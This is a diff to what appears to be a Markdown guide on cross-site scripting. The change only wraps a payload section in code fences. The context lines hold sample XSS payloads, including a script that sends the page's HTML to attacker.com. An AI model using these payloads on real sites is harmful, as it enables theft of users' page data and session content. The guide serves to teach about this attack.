@@ -8,7 +8,7 @@ XSS vulnerabilities allow attackers to inject malicious scripts into web pages v
 Occurs when malicious input is immediately returned by the server in the response without proper sanitization. Requires the victim to click a malicious link.
 
 ##### Payload
-<!-- Basic script injection -->
+~~~<!-- Basic script injection -->
 <script>alert('XSS')</script>
 
 <!-- Image tag with onerror event -->
@@ -80,4 +80,7 @@ Similar to stored XSS but the attacker doesn't see immediate feedback—payload 
 
 <!-- XMLHttpRequest blind exfil -->
 <script>var x=new XMLHttpRequest;x.open('GET','https://attacker.com/xss?d='+btoa(document.body.innerHTML));x.send();</script>
+
+~~~
+
 
